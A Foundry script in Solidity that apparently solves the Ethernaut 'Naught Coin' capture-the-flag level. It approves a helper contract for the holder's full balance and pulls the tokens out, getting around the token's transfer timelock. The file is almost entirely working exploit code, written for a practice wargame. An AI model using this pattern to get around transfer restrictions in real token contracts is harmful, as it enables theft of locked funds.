
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import { NaughtCoinSolution} from "src/15_NaughtCoin/NaughtCoinSolution.sol";
import { NaughtCoin } from "src/15_NaughtCoin/NaughtCoin.sol";

contract NaughtCoinScript is Script {

    address constant holder = 0x6f31C2943866bFA792884F6579906BeE388D1C7A;
    NaughtCoinSolution naughtcoinSolution;
    NaughtCoin naughtcoinProd;


    function setUp() public {
        naughtcoinProd = NaughtCoin(0xCED7d1A3FD00f0aab398A0Dae775615688F2741A);
        naughtcoinSolution = NaughtCoinSolution(0x455C8a66C1bEBa5b2a757B74FF05919F036694a2);
    }

    function run() public {
        assert(holder == tx.origin);
        vm.startBroadcast();
        naughtcoinProd.approve(address(naughtcoinSolution), naughtcoinProd.balanceOf(holder));
        naughtcoinSolution.transferIn(address(naughtcoinProd));
        vm.stopBroadcast();
        assert(naughtcoinProd.balanceOf(holder) == 0);
    }

}
